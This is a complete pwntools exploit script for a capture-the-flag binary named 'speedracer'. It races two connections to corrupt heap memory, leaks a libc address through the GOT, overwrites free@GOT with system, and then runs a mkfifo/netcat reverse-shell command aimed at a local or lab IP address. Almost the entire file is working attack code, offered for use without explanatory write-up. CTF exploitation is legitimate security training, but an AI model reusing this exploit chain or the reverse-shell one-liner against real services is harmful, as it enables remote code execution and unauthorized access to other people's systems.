#!/usr/bin/env python2

from __future__ import print_function

from pwn import *

PROG_PATH = './speedracer'

# LOCAL = True
LOCAL = False

if LOCAL:
    HOST, PORT = 'localhost', 5555
    LIBC_PATH = '/lib/x86_64-linux-gnu/libc.so.6'
    MAGIC_OFFSET = 0x1d5dc0
    SHELL_CMD = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f'
else:
    HOST, PORT = 'docker.acictf.com', 34214
    LIBC_PATH = 'libc.so'
    MAGIC_OFFSET = 0x402270
    SHELL_CMD = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.254.20 9999 >/tmp/f'

RACER_LEN = 0x50
TIMEOUT = 0.1

context.binary = PROG_PATH
context.log_level = 'debug'


class Opcodes:
    CREATE = 0xcccccccc
    PRINT = 0x11111111
    UPDATE = 0xeeeeeeee
    FREE = 0xdddddddd
    RUN = 0xaaaaaaaa
    QUIT = 0xffffffff


class Client:
    def __init__(self):
        self.io = remote(HOST, PORT)

    def send_opcode(self, opcode):
        self.io.recvn(4)
        self.io.send(p32(opcode))

    def create_racer_block_on_read(self, number):
        self.send_opcode(Opcodes.CREATE)

        # name
        self.io.send('A'*0x10)
        # passengers
        self.io.send(p64(1))
        # color
        self.io.send('B'*0x10)
        # a number that is turned into engine speed
        self.io.send('\x00'*100)
        # racer number
        self.io.send(p8(number))
        # description length
        self.io.send(p32(RACER_LEN))

        # we let the program block on the description read()

        return self

    def create_racer_no_block(self, number, description):
        self.send_opcode(Opcodes.CREATE)

        # name
        self.io.send('A'*0x10)
        # passengers
        self.io.send(p64(1))
        # color
        self.io.send('B'*0x10)
        # a number that is turned into engine speed
        self.io.send('\x00'*100)
        # racer number
        self.io.send(p8(number))
        # description length
        self.io.send(p32(len(description)))
        # description
        self.io.send(description)

        return self

    def send_raw(self, data):
        self.io.send(data)
        return self

    def free_racer(self, number):
        self.send_opcode(Opcodes.FREE)
        self.io.send(p8(number))
        return self

    def update_racer_passengers(self, racer_number, num_passengers):
        self.send_opcode(Opcodes.UPDATE)
        self.io.send(p8(racer_number))
        self.io.send(p32(1))
        self.io.send(p64(num_passengers))
        return self

    def update_racer_description(self, racer_number, data):
        self.send_opcode(Opcodes.UPDATE)
        self.io.send(p8(racer_number))
        self.io.send(p32(0))
        self.io.send(p32(len(data)))
        self.io.send(data)
        return self

    def close(self):
        self.io.close()
        return self

    def get_racer_description(self, number):
        self.send_opcode(Opcodes.PRINT)
        self.io.recvuntil('Race Cars:\n\n')
        self.io.send(p8(number))

        racer_str = self.io.recvuntil('Description: ', timeout=TIMEOUT)
        if not racer_str:
            return None

        desc = self.io.recvuntil('\n\n', drop=True)
        return desc


def concurrent_create_two(number1, number2):
    """We need to do these two creations in lockstep to win the race."""
    client1 = Client()
    client2 = Client()

    client1.send_opcode(Opcodes.CREATE)
    client2.send_opcode(Opcodes.CREATE)

    client1.send_raw('E'*0x10)
    client2.send_raw('F'*0x10)

    client1.send_raw(p64(1))
    client2.send_raw(p64(1))

    client1.send_raw('G'*0x10)
    client2.send_raw('H'*0x10)

    client1.send_raw('\x00'*100)
    client2.send_raw('\x00'*100)

    client1.send_raw(p8(number1))
    client2.send_raw(p8(number2))

    client1.send_raw(p32(RACER_LEN))
    client2.send_raw(p32(RACER_LEN))

    client1.send_raw('I'*RACER_LEN)
    client2.send_raw('J'*RACER_LEN)

    client1.close()
    client2.close()


def overwrite_racer(data):
    assert len(data) == RACER_LEN

    writer = Client()

    # Let the first creation request hang on the description read().
    writer.create_racer_block_on_read(1)

    # Free the chunks related to the racer we are still in the process
    # of creating. We need this thread to die so that the freed chunks
    # leave its tcache and can be allocated for one of the racers that
    # we are about to create.
    Client().free_racer(1).close()

    sleep(1)

    # Concurrently create two racers. We are hoping that the chunk
    # allocated to one of these racers (not its description) is the one
    # that the program's read() is still blocking on.
    concurrent_create_two(2, 3)

    sleep(1)

    # Complete the read() that the server has been blocking on for the
    # original racer creation.
    writer.send_raw(data)


def win():
    leak_func = 'write'
    elf = context.binary
    libc = ELF(LIBC_PATH, checksec=False)

    # For eventual overwrite of free@GOT.
    free_got = elf.got['free']
    fake_next_ptr = free_got - 0x10

    # This is the actual value in the binary at the address fake_next_ptr + 0x48.
    fake_racer_num = 0x26

    # libc leak
    fake_racer = p64(fake_next_ptr) + '\x00' * 56 + p64(elf.got[leak_func])
    fake_racer += '\x00' * (RACER_LEN - len(fake_racer))

    log.info('Racing to leak a libc address...')
    log.info('%s@GOT == %#x' % (leak_func, elf.got[leak_func]))
    overwrite_racer(fake_racer)

    reader = Client()
    raw_leak = reader.get_racer_description(0)
    reader.close()

    leak_addr = u64(raw_leak.ljust(8, '\x00'))
    libc.address = leak_addr - MAGIC_OFFSET
    log.info('Leaked loaded %s address of %#x' % (leak_func, leak_addr))
    log.info('Computed libc base at %#x' % libc.address)
    libc_system = libc.symbols['system']
    log.info('Will use system@libc at %#x' % libc_system)

    # GOT overwrite.
    log.info('Using free@GOT at %#x' % free_got)
    log.info('Using fake next pointer of %#x' % fake_next_ptr)

    Client().update_racer_passengers(fake_racer_num, libc_system).close()

    Client().create_racer_no_block(13, SHELL_CMD).close()
    Client().update_racer_description(13, 'dummy').close()


if __name__ == '__main__':
    win()